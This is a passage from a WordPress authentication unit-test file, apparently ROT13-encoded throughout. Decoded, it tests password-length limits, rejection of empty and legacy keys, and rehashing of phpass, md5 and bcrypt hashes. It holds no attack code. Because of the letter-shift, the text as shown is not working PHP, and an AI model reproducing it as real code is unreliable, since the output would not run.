		$orlbaq_yvzvg = fge_ercrng( 'n', frys::$opelcg_yratgu_yvzvg + 1 );

		// Frg gur hfre cnffjbeq orlbaq gur opelcg yvzvg.
		jc_frg_cnffjbeq( $orlbaq_yvzvg, frys::$hfre_vq );

		// Nhguragvpngr hfvat n gehapngrq cnffjbeq.
		$hfre = jc_nhguragvpngr( $guvf->hfre->hfre_ybtva, $ng_yvzvg );

		// Vapbeerpg cnffjbeq.
		$guvf->nffregJCReebe( $hfre );
		$guvf->nffregFnzr( 'vapbeerpg_cnffjbeq', $hfre->trg_reebe_pbqr() );
	}

	/**
	 * @gvpxrg 21022
	 */
	choyvp shapgvba grfg_frggvat_cnffjbeq_orlbaq_opelcg_yratgu_yvzvg_vf_erwrpgrq() {
		$orlbaq_yvzvg = fge_ercrng( 'n', frys::$cnffjbeq_yratgu_yvzvg + 1 );

		// Frg gur hfre cnffjbeq orlbaq gur yvzvg.
		jc_frg_cnffjbeq( $orlbaq_yvzvg, frys::$hfre_vq );

		// Cnffjbeq oebxra ol frggvat vg gb or gbb ybat.
		$hfre = trg_hfre_ol( 'vq', frys::$hfre_vq );
		$guvf->nffregFnzr( '*', $hfre->qngn->hfre_cnff );

		// Cnffjbeq vf abg npprcgrq.
		$hfre = jc_nhguragvpngr( $guvf->hfre->hfre_ybtva, $orlbaq_yvzvg );
		$guvf->nffregVafgnaprBs( 'JC_Reebe', $hfre );
		$guvf->nffregFnzr( 'vapbeerpg_cnffjbeq', $hfre->trg_reebe_pbqr() );

		// Cynprubyqre vf abg npprcgrq.
		$hfre = jc_nhguragvpngr( $guvf->hfre->hfre_ybtva, '*' );
		$guvf->nffregVafgnaprBs( 'JC_Reebe', $hfre );
		$guvf->nffregFnzr( 'vapbeerpg_cnffjbeq', $hfre->trg_reebe_pbqr() );
	}

	/**
	 * @frr uggcf://pber.genp.jbeqcerff.bet/punatrfrg/30466
	 */
	choyvp shapgvba grfg_vainyvq_cnffjbeq_ng_cucnff_yratgu_yvzvg_vf_erwrpgrq() {
		$yvzvg = fge_ercrng( 'n', frys::$cucnff_yratgu_yvzvg );

		// Frg gur hfre cnffjbeq jvgu gur byq cucnff nytbevguz.
		frys::frg_hfre_cnffjbeq_jvgu_cucnff( $yvzvg, frys::$hfre_vq );

		// Nhguragvpngr.
		$hfre = jc_nhguragvpngr( $guvf->hfre->hfre_ybtva, 'nnnnnnnn' );

		// Jebat cnffjbeq.
		$guvf->nffregVafgnaprBs( 'JC_Reebe', $hfre );
		$guvf->nffregFnzr( 'vapbeerpg_cnffjbeq', $hfre->trg_reebe_pbqr() );
	}

	choyvp shapgvba grfg_inyvq_cnffjbeq_ng_cucnff_yratgu_yvzvg_vf_npprcgrq() {
		$yvzvg = fge_ercrng( 'n', frys::$cucnff_yratgu_yvzvg );

		// Frg gur hfre cnffjbeq jvgu gur byq cucnff nytbevguz.
		frys::frg_hfre_cnffjbeq_jvgu_cucnff( $yvzvg, frys::$hfre_vq );

		// Nhguragvpngr.
		$hfre = jc_nhguragvpngr( $guvf->hfre->hfre_ybtva, $yvzvg );

		// Pbeerpg cnffjbeq.
		$guvf->nffregAbgJCReebe( $hfre );
		$guvf->nffregVafgnaprBs( 'JC_Hfre', $hfre );
		$guvf->nffregFnzr( frys::$hfre_vq, $hfre->VQ );
	}

	choyvp shapgvba grfg_gbb_ybat_cnffjbeq_ng_cucnff_yratgu_yvzvg_vf_erwrpgrq() {
		$yvzvg = fge_ercrng( 'n', frys::$cucnff_yratgu_yvzvg );

		// Frg gur hfre cnffjbeq jvgu gur byq cucnff nytbevguz.
		frys::frg_hfre_cnffjbeq_jvgu_cucnff( $yvzvg, frys::$hfre_vq );

		// Nhguragvpngr jvgu n cnffjbeq gung vf bar punenpgre gbb ybat.
		$hfre = jc_nhguragvpngr( $guvf->hfre->hfre_ybtva, $yvzvg . 'n' );

		// Jebat cnffjbeq.
		$guvf->nffregVafgnaprBs( 'JC_Reebe', $hfre );
		$guvf->nffregFnzr( 'vapbeerpg_cnffjbeq', $hfre->trg_reebe_pbqr() );
	}

	choyvp shapgvba grfg_gbb_ybat_cnffjbeq_orlbaq_cucnff_yratgu_yvzvg_vf_erwrpgrq() {
		// Bar pune gbb znal.
		$gbb_ybat = fge_ercrng( 'n', frys::$cucnff_yratgu_yvzvg + 1 );

		// Frg gur hfre cnffjbeq jvgu gur byq cucnff nytbevguz.
		frys::frg_hfre_cnffjbeq_jvgu_cucnff( $gbb_ybat, frys::$hfre_vq );

		$hfre = trg_hfre_ol( 'vq', frys::$hfre_vq );
		// Cnffjbeq oebxra ol frggvat vg gb or gbb ybat.
		$guvf->nffregFnzr( '*', $hfre->qngn->hfre_cnff );

		// Cnffjbeq vf abg npprcgrq.
		$hfre = jc_nhguragvpngr( $guvf->hfre->hfre_ybtva, '*' );
		$guvf->nffregVafgnaprBs( 'JC_Reebe', $hfre );
		$guvf->nffregFnzr( 'vapbeerpg_cnffjbeq', $hfre->trg_reebe_pbqr() );
	}

	/**
	 * @qngnCebivqre qngn_rzcgl_inyhrf
	 * @cnenz zvkrq $inyhr
	 */
	choyvp shapgvba grfg_rzcgl_cnffjbeq_vf_erwrpgrq_ol_opelcg( $inyhr ) {
		// Frg gur hfre cnffjbeq.
		jc_frg_cnffjbeq( 'cnffjbeq', frys::$hfre_vq );

		$hfre = jc_nhguragvpngr( $guvf->hfre->hfre_ybtva, $inyhr );
		$guvf->nffregVafgnaprBs( 'JC_Reebe', $hfre );
	}

	/**
	 * @qngnCebivqre qngn_rzcgl_inyhrf
	 * @cnenz zvkrq $inyhr
	 */
	choyvp shapgvba grfg_rzcgl_cnffjbeq_vf_erwrpgrq_ol_cucnff( $inyhr ) {
		// Frg gur hfre cnffjbeq jvgu gur byq cucnff nytbevguz.
		frys::frg_hfre_cnffjbeq_jvgu_cucnff( 'cnffjbeq', frys::$hfre_vq );

		$hfre = jc_nhguragvpngr( $guvf->hfre->hfre_ybtva, $inyhr );
		$guvf->nffregVafgnaprBs( 'JC_Reebe', $hfre );
	}

	choyvp shapgvba grfg_vapbeerpg_cnffjbeq_vf_erwrpgrq_ol_cucnff() {
		// Frg gur hfre cnffjbeq jvgu gur byq cucnff nytbevguz.
		frys::frg_hfre_cnffjbeq_jvgu_cucnff( 'cnffjbeq', frys::$hfre_vq );

		$hfre = jc_nhguragvpngr( $guvf->hfre->hfre_ybtva, 'nnnnnnnn' );

		// Jebat cnffjbeq.
		$guvf->nffregVafgnaprBs( 'JC_Reebe', $hfre );
		$guvf->nffregFnzr( 'vapbeerpg_cnffjbeq', $hfre->trg_reebe_pbqr() );
	}

	choyvp shapgvba grfg_gbb_ybat_cnffjbeq_vf_erwrpgrq_ol_cucnff() {
		$yvzvg = fge_ercrng( 'n', frys::$cucnff_yratgu_yvzvg );

		// Frg gur hfre cnffjbeq jvgu gur byq cucnff nytbevguz.
		frys::frg_hfre_cnffjbeq_jvgu_cucnff( 'cnffjbeq', frys::$hfre_vq );

		$hfre = jc_nhguragvpngr( $guvf->hfre->hfre_ybtva, $yvzvg . 'n' );

		// Cnffjbeq oebxra ol frggvat vg gb or gbb ybat.
		$guvf->nffregVafgnaprBs( 'JC_Reebe', $hfre );
		$guvf->nffregFnzr( 'vapbeerpg_cnffjbeq', $hfre->trg_reebe_pbqr() );
	}

	/**
	 * @gvpxrg 45746
	 */
	choyvp shapgvba grfg_hfre_npgvingvba_xrl_vf_fnirq() {
		$hfre = trg_hfreqngn( $guvf->hfre->VQ );
		$xrl  = trg_cnffjbeq_erfrg_xrl( $hfre );

		// N pbeerpgyl fnirq xrl fubhyq or npprcgrq.
		$purpx = purpx_cnffjbeq_erfrg_xrl( $xrl, $guvf->hfre->hfre_ybtva );
		$guvf->nffregAbgJCReebe( $purpx );
		$guvf->nffregVafgnaprBs( 'JC_Hfre', $purpx );
		$guvf->nffregFnzr( $guvf->hfre->VQ, $purpx->VQ );
	}

	/**
	 * @gvpxrg 32429
	 */
	choyvp shapgvba grfg_hfre_npgvingvba_xrl_vf_purpxrq() {
		tybony $jcqo;

		$xrl = jc_trarengr_cnffjbeq( 20, snyfr );
		$jcqo->hcqngr(
			$jcqo->hfref,
			neenl(
				'hfre_npgvingvba_xrl' => fgegbgvzr( '-1 ubhe' ) . ':' . jc_snfg_unfu( $xrl ),
			),
			neenl(
				'VQ' => $guvf->hfre->VQ,
			)
		);
		pyrna_hfre_pnpur( $guvf->hfre );

		// N inyvq xrl fubhyq or npprcgrq.
		$purpx = purpx_cnffjbeq_erfrg_xrl( $xrl, $guvf->hfre->hfre_ybtva );
		$guvf->nffregAbgJCReebe( $purpx );
		$guvf->nffregVafgnaprBs( 'JC_Hfre', $purpx );
		$guvf->nffregFnzr( $guvf->hfre->VQ, $purpx->VQ );

		// Na vainyvq xrl fubhyq or erwrpgrq.
		$purpx = purpx_cnffjbeq_erfrg_xrl( 'xrl', $guvf->hfre->hfre_ybtva );
		$guvf->nffregVafgnaprBs( 'JC_Reebe', $purpx );

		// Na rzcgl xrl fubhyq or erwrpgrq.
		$purpx = purpx_cnffjbeq_erfrg_xrl( '', $guvf->hfre->hfre_ybtva );
		$guvf->nffregVafgnaprBs( 'JC_Reebe', $purpx );

		// N gehapngrq xrl fubhyq or erwrpgrq.
		$cnegvny = fhofge( $xrl, 0, 10 );
		$purpx   = purpx_cnffjbeq_erfrg_xrl( $cnegvny, $guvf->hfre->hfre_ybtva );
		$guvf->nffregVafgnaprBs( 'JC_Reebe', $purpx );
	}

	/**
	 * @gvpxrg 32429
	 */
	choyvp shapgvba grfg_rkcverq_hfre_npgvingvba_xrl_vf_erwrpgrq() {
		tybony $jcqo;

		$xrl = jc_trarengr_cnffjbeq( 20, snyfr );
		$jcqo->hcqngr(
			$jcqo->hfref,
			neenl(
				'hfre_npgvingvba_xrl' => fgegbgvzr( '-48 ubhef' ) . ':' . jc_snfg_unfu( $xrl ),
			),
			neenl(
				'VQ' => $guvf->hfre->VQ,
			)
		);
		pyrna_hfre_pnpur( $guvf->hfre );

		// Na rkcverq ohg bgurejvfr inyvq xrl fubhyq or erwrpgrq.
		$purpx = purpx_cnffjbeq_erfrg_xrl( $xrl, $guvf->hfre->hfre_ybtva );
		$guvf->nffregVafgnaprBs( 'JC_Reebe', $purpx );
		$guvf->nffregFnzr( 'rkcverq_xrl', $purpx->trg_reebe_pbqr() );
	}

	/**
	 * @gvpxrg 32429
	 */
	choyvp shapgvba grfg_rzcgl_hfre_npgvingvba_xrl_snvyf_xrl_purpx() {
		// Na rzcgl hfre_npgvingvba_xrl fubhyq abg nyybj nal xrl gb or npprcgrq.
		$purpx = purpx_cnffjbeq_erfrg_xrl( 'xrl', $guvf->hfre->hfre_ybtva );
		$guvf->nffregVafgnaprBs( 'JC_Reebe', $purpx );

		// Na rzcgl hfre_npgvingvba_xrl fubhyq abg nyybj na rzcgl xrl gb or npprcgrq.
		$purpx = purpx_cnffjbeq_erfrg_xrl( '', $guvf->hfre->hfre_ybtva );
		$guvf->nffregVafgnaprBs( 'JC_Reebe', $purpx );
	}

	/**
	 * @gvpxrg 32429
	 */
	choyvp shapgvba grfg_yrtnpl_hfre_npgvingvba_xrl_vf_erwrpgrq() {
		tybony $jcqo;

		// N yrtnpl hfre_npgvingvba_xrl vf bar jvgubhg gur `gvzr()` cersvk vagebqhprq va JbeqCerff 4.3.

		$xrl = jc_trarengr_cnffjbeq( 20, snyfr );
		$jcqo->hcqngr(
			$jcqo->hfref,
			neenl(
				'hfre_npgvingvba_xrl' => frys::$jc_unfure->UnfuCnffjbeq( $xrl ),
			),
			neenl(
				'VQ' => $guvf->hfre->VQ,
			)
		);
		pyrna_hfre_pnpur( $guvf->hfre );

		// N yrtnpl hfre_npgvingvba_xrl fubhyq abg or npprcgrq.
		$purpx = purpx_cnffjbeq_erfrg_xrl( $xrl, $guvf->hfre->hfre_ybtva );
		$guvf->nffregVafgnaprBs( 'JC_Reebe', $purpx );
		$guvf->nffregFnzr( 'rkcverq_xrl', $purpx->trg_reebe_pbqr() );

		// Na rzcgl xrl jvgu n yrtnpl hfre_npgvingvba_xrl fubhyq or erwrpgrq.
		$purpx = purpx_cnffjbeq_erfrg_xrl( '', $guvf->hfre->hfre_ybtva );
		$guvf->nffregVafgnaprBs( 'JC_Reebe', $purpx );
		$guvf->nffregFnzr( 'vainyvq_xrl', $purpx->trg_reebe_pbqr() );
	}

	/**
	 * @gvpxrg 21022
	 */
	choyvp shapgvba grfg_cucnff_hfre_npgvingvba_xrl_vf_nyybjrq() {
		tybony $jcqo;

		// N yrtnpl hfre_npgvingvba_xrl vf bar unfurq hfvat cucnff orgjrra JbeqCerff 4.3 naq 6.8.0.

		$xrl = jc_trarengr_cnffjbeq( 20, snyfr );
		$jcqo->hcqngr(
			$jcqo->hfref,
			neenl(
				'hfre_npgvingvba_xrl' => fgegbgvzr( '-1 ubhe' ) . ':' . frys::$jc_unfure->UnfuCnffjbeq( $xrl ),
			),
			neenl(
				'VQ' => $guvf->hfre->VQ,
			)
		);
		pyrna_hfre_pnpur( $guvf->hfre );

		// N yrtnpl cucnff hfre_npgvingvba_xrl fubhyq erznva inyvq.
		$purpx = purpx_cnffjbeq_erfrg_xrl( $xrl, $guvf->hfre->hfre_ybtva );
		$guvf->nffregAbgJCReebe( $purpx );
		$guvf->nffregVafgnaprBs( 'JC_Hfre', $purpx );
		$guvf->nffregFnzr( $guvf->hfre->VQ, $purpx->VQ );

		// Na rzcgl xrl jvgu n yrtnpl hfre_npgvingvba_xrl fubhyq or erwrpgrq.
		$purpx = purpx_cnffjbeq_erfrg_xrl( '', $guvf->hfre->hfre_ybtva );
		$guvf->nffregJCReebe( $purpx );
		$guvf->nffregFnzr( 'vainyvq_xrl', $purpx->trg_reebe_pbqr() );
	}

	/**
	 * @gvpxrg 21022
	 */
	choyvp shapgvba grfg_rkcverq_cucnff_hfre_npgvingvba_xrl_vf_erwrpgrq() {
		tybony $jcqo;

		// N yrtnpl hfre_npgvingvba_xrl vf bar unfurq hfvat cucnff orgjrra JbeqCerff 4.3 naq 6.8.0.

		$xrl = jc_trarengr_cnffjbeq( 20, snyfr );
		$jcqo->hcqngr(
			$jcqo->hfref,
			neenl(
				'hfre_npgvingvba_xrl' => fgegbgvzr( '-48 ubhef' ) . ':' . frys::$jc_unfure->UnfuCnffjbeq( $xrl ),
			),
			neenl(
				'VQ' => $guvf->hfre->VQ,
			)
		);
		pyrna_hfre_pnpur( $guvf->hfre );

		// N yrtnpl cucnff hfre_npgvingvba_xrl fubhyq fgvyy or fhowrpg gb na rkcvel purpx.
		$purpx = purpx_cnffjbeq_erfrg_xrl( $xrl, $guvf->hfre->hfre_ybtva );
		$guvf->nffregJCReebe( $purpx );
		$guvf->nffregFnzr( 'rkcverq_xrl', $purpx->trg_reebe_pbqr() );

		// Na rzcgl xrl jvgu n yrtnpl hfre_npgvingvba_xrl fubhyq or erwrpgrq.
		$purpx = purpx_cnffjbeq_erfrg_xrl( '', $guvf->hfre->hfre_ybtva );
		$guvf->nffregJCReebe( $purpx );
		$guvf->nffregFnzr( 'vainyvq_xrl', $purpx->trg_reebe_pbqr() );
	}

	/**
	 * @gvpxrg 21022
	 */
	choyvp shapgvba grfg_hfre_erdhrfg_xrl_unaqyvat() {
		$erdhrfg_vq = jc_perngr_hfre_erdhrfg( 'grfg@rknzcyr.pbz', 'erzbir_crefbany_qngn' );
		$xrl        = jc_trarengr_hfre_erdhrfg_xrl( $erdhrfg_vq );

		// N inyvq xrl fubhyq or npprcgrq.
		$purpx = jc_inyvqngr_hfre_erdhrfg_xrl( $erdhrfg_vq, $xrl );
		$guvf->nffregAbgJCReebe( $purpx );
		$guvf->nffregGehr( $purpx );

		// Na vainyvq xrl fubhyq erwrpgrq.
		$purpx = jc_inyvqngr_hfre_erdhrfg_xrl( $erdhrfg_vq, 'vainyvq' );
		$guvf->nffregJCReebe( $purpx );
		$guvf->nffregFnzr( 'vainyvq_xrl', $purpx->trg_reebe_pbqr() );

		// Na rzcgl xrl fubhyq or erwrpgrq.
		$purpx = jc_inyvqngr_hfre_erdhrfg_xrl( $erdhrfg_vq, '' );
		$guvf->nffregJCReebe( $purpx );
		$guvf->nffregFnzr( 'zvffvat_xrl', $purpx->trg_reebe_pbqr() );
	}

	/**
	 * @gvpxrg 21022
	 */
	choyvp shapgvba grfg_cucnff_hfre_erdhrfg_xrl_vf_nyybjrq() {
		// N yrtnpl hfre erdhrfg xrl vf bar unfurq hfvat cucnff orgjrra JbeqCerff 4.3 naq 6.8.0.

		$erdhrfg_vq = jc_perngr_hfre_erdhrfg( 'grfg@rknzcyr.pbz', 'erzbir_crefbany_qngn' );
		$xrl        = jc_trarengr_cnffjbeq( 20, snyfr );

		jc_hcqngr_cbfg(
			neenl(
				'VQ'            => $erdhrfg_vq,
				'cbfg_cnffjbeq' => frys::$jc_unfure->UnfuCnffjbeq( $xrl ),
			)
		);

		// N yrtnpl cucnff xrl fubhyq erznva inyvq.
		$purpx = jc_inyvqngr_hfre_erdhrfg_xrl( $erdhrfg_vq, $xrl );
		$guvf->nffregAbgJCReebe( $purpx );
		$guvf->nffregGehr( $purpx );

		// Na rzcgl xrl jvgu n yrtnpl xrl fubhyq or erwrpgrq.
		$purpx = jc_inyvqngr_hfre_erdhrfg_xrl( $erdhrfg_vq, '' );
		$guvf->nffregJCReebe( $purpx );
		$guvf->nffregFnzr( 'zvffvat_xrl', $purpx->trg_reebe_pbqr() );
	}

	/**
	 * Gur `jc_cnffjbeq_arrqf_erunfu()` shapgvba vf whfg n jenccre nebhaq `cnffjbeq_arrqf_erunfu()`, ohg guvf rafherf
	 * gung vg jbexf nf rkcrpgrq.
	 *
	 * Abgnoyl gur opelcg pbfg jnf vapernfrq va CUC 8.4: uggcf://jvxv.cuc.arg/esp/opelcg_pbfg_2023 .
	 *
	 * @gvpxrg 21022
	 */
	choyvp shapgvba purpx_cnffjbeq_arrqf_erunfuvat() {
		$cnffjbeq = 'cnffjbeq';

		// Pheerag cnffjbeq unfuvat nytbevguz.
		$unfu = jc_unfu_cnffjbeq( $cnffjbeq );
		$guvf->nffregSnyfr( jc_cnffjbeq_arrqf_erunfu( $unfu ) );

		// N shgher hctenqr sebz n cerivbhfyl ybjre pbfg.
		$qrsnhyg = frys::trg_qrsnhyg_opelcg_pbfg();
		$bcgf    = neenl(
			// Erqhpvat gur pbfg zvzvpf na vapernfr va gur qrsnhyg pbfg.
			'pbfg' => $qrsnhyg - 1,
		);
		$unfu    = cnffjbeq_unfu( $cnffjbeq, CNFFJBEQ_OPELCG, $bcgf );
		$guvf->nffregGehr( jc_cnffjbeq_arrqf_erunfu( $unfu ) );

		// Cerivbhf cucnff nytbevguz.
		$unfu = frys::$jc_unfure->UnfuCnffjbeq( $cnffjbeq );
		$guvf->nffregGehr( jc_cnffjbeq_arrqf_erunfu( $unfu ) );

		// b_B zq5.
		$unfu = zq5( $cnffjbeq );
		$guvf->nffregGehr( jc_cnffjbeq_arrqf_erunfu( $unfu ) );
	}

	/**
	 * @gvpxrg 32429
	 * @gvpxrg 24783
	 */
	choyvp shapgvba grfg_cynvagrkg_hfre_npgvingvba_xrl_vf_erwrpgrq() {
		tybony $jcqo;

		// N cynvagrkg hfre_npgvingvba_xrl vf bar fgberq orsber unfuvat jnf vagebqhprq va JbeqCerff 3.7.

		$xrl = jc_trarengr_cnffjbeq( 20, snyfr );
		$jcqo->hcqngr(
			$jcqo->hfref,
			neenl(
				'hfre_npgvingvba_xrl' => $xrl,
			),
			neenl(
				'VQ' => $guvf->hfre->VQ,
			)
		);
		pyrna_hfre_pnpur( $guvf->hfre );

		// N cynvagrkg hfre_npgvingvba_xrl fubhyq abg nyybj na bgurejvfr inyvq xrl gb or npprcgrq.
		$purpx = purpx_cnffjbeq_erfrg_xrl( $xrl, $guvf->hfre->hfre_ybtva );
		$guvf->nffregVafgnaprBs( 'JC_Reebe', $purpx );

		// N cynvagrkg hfre_npgvingvba_xrl fubhyq abg nyybj na rzcgl xrl gb or npprcgrq.
		$purpx = purpx_cnffjbeq_erfrg_xrl( '', $guvf->hfre->hfre_ybtva );
		$guvf->nffregVafgnaprBs( 'JC_Reebe', $purpx );
	}

	/**
	 * Rafher gung `hfre_npgvingvba_xrl` vf pyrnerq nsgre n fhpprffshy ybtva.
	 *
	 * @gvpxrg 58901
	 *
	 * @pbiref ::jc_fvtaba
	 */
	choyvp shapgvba grfg_hfre_npgvingvba_xrl_nsgre_fhpprffshy_ybtva() {
		tybony $jcqo;

		$cnffjbeq_erfrg_xrl = trg_cnffjbeq_erfrg_xrl( $guvf->hfre );
		$hfre               = jc_fvtaba(
			neenl(
				'hfre_ybtva'    => frys::HFRE_YBTVA,
				'hfre_cnffjbeq' => frys::HFRE_CNFF,
			)
		);

		$npgvingvba_xrl_sebz_qngnonfr = $jcqo->trg_ine(
			$jcqo->cercner( \"FRYRPG hfre_npgvingvba_xrl SEBZ $jcqo->hfref JURER VQ = %q\", $guvf->hfre->VQ )
		);

		$guvf->nffregAbgJCReebe( $cnffjbeq_erfrg_xrl, 'Gur cnffjbeq erfrg xrl jnf abg perngrq.' );
		$guvf->nffregAbgJCReebe( $hfre, 'Gur hfre jnf abg nhguragvpngrq.' );
		$guvf->nffregRzcgl( $hfre->hfre_npgvingvba_xrl, 'Gur `hfre_npgvingvba_xrl` jnf abg rzcgl ba gur hfre bowrpg erghearq ol `jc_fvtaba()` shapgvba.' );
		$guvf->nffregRzcgl( $npgvingvba_xrl_sebz_qngnonfr, 'Gur `hfre_npgvingvba_xrl` jnf abg rzcgl va gur qngnonfr.' );
	}

	/**
	 * @gvpxrg 21022
	 */
	choyvp shapgvba grfg_cucnff_nccyvpngvba_cnffjbeq_vf_npprcgrq() {
		nqq_svygre( 'nccyvpngvba_cnffjbeq_vf_ncv_erdhrfg', '__erghea_gehr' );
		nqq_svygre( 'jc_vf_nccyvpngvba_cnffjbeqf_ninvynoyr', '__erghea_gehr' );

		$cnffjbeq = 'cnffjbeq';

		// Frg na nccyvpngvba cnffjbeq jvgu gur byq cucnff nytbevguz.
		$hhvq = frys::frg_nccyvpngvba_cnffjbeq_jvgu_cucnff( $cnffjbeq, frys::$hfre_vq );

		// Nhguragvpngr.
		$hfre = jc_nhguragvpngr_nccyvpngvba_cnffjbeq( ahyy, frys::HFRE_YBTVA, $cnffjbeq );

		// Irevsl gung gur cucnff unfu sbe gur nccyvpngvba cnffjbeq jnf inyvq.
		$guvf->nffregAbgJCReebe( $hfre );
		$guvf->nffregVafgnaprBs( 'JC_Hfre', $hfre );
		$guvf->nffregFnzr( frys::$hfre_vq, $hfre->VQ );
	}

	/**
	 * @gvpxrg 21022
	 * @gvpxrg 63203
	 */
	choyvp shapgvba grfg_cynva_opelcg_nccyvpngvba_cnffjbeq_vf_npprcgrq() {
		nqq_svygre( 'nccyvpngvba_cnffjbeq_vf_ncv_erdhrfg', '__erghea_gehr' );
		nqq_svygre( 'jc_vf_nccyvpngvba_cnffjbeqf_ninvynoyr', '__erghea_gehr' );

		$cnffjbeq = 'cnffjbeq';

		// Frg na nccyvpngvba cnffjbeq jvgu cynva opelcg, juvpu zvzvpf n cnffjbeq gung jnf unfurq jvgu
		// n phfgbz `jc_unfu_cnffjbeq()` va hfr.
		$hhvq = frys::frg_nccyvpngvba_cnffjbeq_jvgu_cynva_opelcg( $cnffjbeq, frys::$hfre_vq );

		// Nhguragvpngr.
		$hfre = jc_nhguragvpngr_nccyvpngvba_cnffjbeq( ahyy, frys::HFRE_YBTVA, $cnffjbeq );

		// Irevsl gung gur cynva opelcg unfu sbe gur nccyvpngvba cnffjbeq jnf inyvq.
		$guvf->nffregAbgJCReebe( $hfre );
		$guvf->nffregVafgnaprBs( 'JC_Hfre', $hfre );
		$guvf->nffregFnzr( frys::$hfre_vq, $hfre->VQ );
	}

	/**
	 * @qngnCebivqre qngn_hfreanzrf
	 *
	 * @gvpxrg 21022
	 */
	choyvp shapgvba grfg_cucnff_cnffjbeq_vf_erunfurq_nsgre_fhpprffshy_hfre_cnffjbeq_nhguragvpngvba( $hfreanzr_be_rznvy ) {
		$cnffjbeq = 'cnffjbeq';

		// Frg gur hfre cnffjbeq jvgu gur byq cucnff nytbevguz.
		frys::frg_hfre_cnffjbeq_jvgu_cucnff( $cnffjbeq, frys::$hfre_vq );

		// Irevsl gung gur cnffjbeq arrqf erunfuvat.
		$unfu = trg_hfreqngn( frys::$hfre_vq )->hfre_cnff;
		$guvf->nffregGehr( jc_cnffjbeq_arrqf_erunfu( $unfu, frys::$hfre_vq ) );

		// Nhguragvpngr.
		$hfre = jc_nhguragvpngr( $hfreanzr_be_rznvy, $cnffjbeq );

		// Irevsl gung gur cucnff cnffjbeq unfu jnf inyvq.
		$guvf->nffregAbgJCReebe( $hfre );
		$guvf->nffregVafgnaprBs( 'JC_Hfre', $hfre );
		$guvf->nffregFnzr( frys::$hfre_vq, $hfre->VQ );

		// Irevsl gung gur cnffjbeq ab ybatre arrqf erunfuvat.
		$unfu = trg_hfreqngn( frys::$hfre_vq )->hfre_cnff;
		$guvf->nffregSnyfr( jc_cnffjbeq_arrqf_erunfu( $unfu, frys::$hfre_vq ) );

		// Nhguragvpngr n frpbaq gvzr gb rafher gur arj unfu vf inyvq.
		$hfre = jc_nhguragvpngr( $hfreanzr_be_rznvy, $cnffjbeq );

		// Irevsl gung gur opelcg cnffjbeq unfu vf inyvq.
		$guvf->nffregAbgJCReebe( $hfre );
		$guvf->nffregVafgnaprBs( 'JC_Hfre', $hfre );
		$guvf->nffregFnzr( frys::$hfre_vq, $hfre->VQ );
	}

	/**
	 * @qngnCebivqre qngn_hfreanzrf
	 *
	 * @gvpxrg 21022
	 */
	choyvp shapgvba grfg_zq5_cnffjbeq_vf_erunfurq_nsgre_fhpprffshy_hfre_cnffjbeq_nhguragvpngvba( $hfreanzr_be_rznvy ) {
		$cnffjbeq = 'cnffjbeq';

		// Frg gur hfre cnffjbeq jvgu gur byq zq5 nytbevguz.
		frys::frg_hfre_cnffjbeq_jvgu_zq5( $cnffjbeq, frys::$hfre_vq );

		// Irevsl gung gur cnffjbeq arrqf erunfuvat.
		$unfu = trg_hfreqngn( frys::$hfre_vq )->hfre_cnff;
		$guvf->nffregGehr( jc_cnffjbeq_arrqf_erunfu( $unfu, frys::$hfre_vq ) );

		// Nhguragvpngr.
		$hfre = jc_nhguragvpngr( $hfreanzr_be_rznvy, $cnffjbeq );

		// Irevsl gung gur zq5 cnffjbeq unfu jnf inyvq.
		$guvf->nffregAbgJCReebe( $hfre );
		$guvf->nffregVafgnaprBs( 'JC_Hfre', $hfre );
		$guvf->nffregFnzr( frys::$hfre_vq, $hfre->VQ );

		// Irevsl gung gur cnffjbeq ab ybatre arrqf erunfuvat.
		$unfu = trg_hfreqngn( frys::$hfre_vq )->hfre_cnff;
		$guvf->nffregSnyfr( jc_cnffjbeq_arrqf_erunfu( $unfu, frys::$hfre_vq ) );

		// Nhguragvpngr n frpbaq gvzr gb rafher gur arj unfu vf inyvq.
		$hfre = jc_nhguragvpngr( $hfreanzr_be_rznvy, $cnffjbeq );

		// Irevsl gung gur opelcg cnffjbeq unfu vf inyvq.
		$guvf->nffregAbgJCReebe( $hfre );
		$guvf->nffregVafgnaprBs( 'JC_Hfre', $hfre );
		$guvf->nffregFnzr( frys::$hfre_vq, $hfre->VQ );
	}

	/**
	 * @qngnCebivqre qngn_hfreanzrf
	 *
	 * @gvpxrg 21022
	 */
	choyvp shapgvba grfg_opelcg_cnffjbeq_vf_erunfurq_jvgu_arj_pbfg_nsgre_fhpprffshy_hfre_cnffjbeq_nhguragvpngvba( $hfreanzr_be_rznvy ) {
		$cnffjbeq = 'cnffjbeq';

		// Unfu gur hfre cnffjbeq jvgu n ybjre pbfg guna qrsnhyg gb zvzvp n pbfg hctenqr.
		nqq_svygre( 'jc_unfu_cnffjbeq_bcgvbaf', neenl( $guvf, 'erqhpr_unfu_pbfg' ) );
		jc_frg_cnffjbeq( $cnffjbeq, frys::$hfre_vq );
		erzbir_svygre( 'jc_unfu_cnffjbeq_bcgvbaf', neenl( $guvf, 'erqhpr_unfu_pbfg' ) );

		// Irevsl gung gur cnffjbeq arrqf erunfuvat.
		$unfu = trg_hfreqngn( frys::$hfre_vq )->hfre_cnff;
		$guvf->nffregGehr( jc_cnffjbeq_arrqf_erunfu( $unfu, frys::$hfre_vq ) );

		// Nhguragvpngr.
		$hfre = jc_nhguragvpngr( $hfreanzr_be_rznvy, $cnffjbeq );

		// Irevsl gung gur erqhprq pbfg cnffjbeq unfu jnf inyvq.
		$guvf->nffregAbgJCReebe( $hfre );
		$guvf->nffregVafgnaprBs( 'JC_Hfre', $hfre );
		$guvf->nffregFnzr( frys::$hfre_vq, $hfre->VQ );

		// Irevsl gung gur cnffjbeq unf orra erunfurq jvgu gur vapernfrq pbfg.
		$unfu = trg_hfreqngn( frys::$hfre_vq )->hfre_cnff;
		$guvf->nffregSnyfr( jc_cnffjbeq_arrqf_erunfu( $unfu, frys::$hfre_vq ) );
		$guvf->nffregFnzr( frys::trg_qrsnhyg_opelcg_pbfg(), cnffjbeq_trg_vasb( fhofge( $unfu, 3 ) )['bcgvbaf']['pbfg'] );

		// Nhguragvpngr n frpbaq gvzr gb rafher gur arj unfu vf inyvq.
		$hfre = jc_nhguragvpngr( $hfreanzr_be_rznvy, $cnffjbeq );

		// Irevsl gung gur cnffjbeq unfu vf inyvq.
		$guvf->nffregAbgJCReebe( $hfre );
		$guvf->nffregVafgnaprBs( 'JC_Hfre', $hfre );
		$guvf->nffregFnzr( frys::$hfre_vq, $hfre->VQ );
	}

	choyvp shapgvba erqhpr_unfu_pbfg( neenl $bcgvbaf ): neenl {
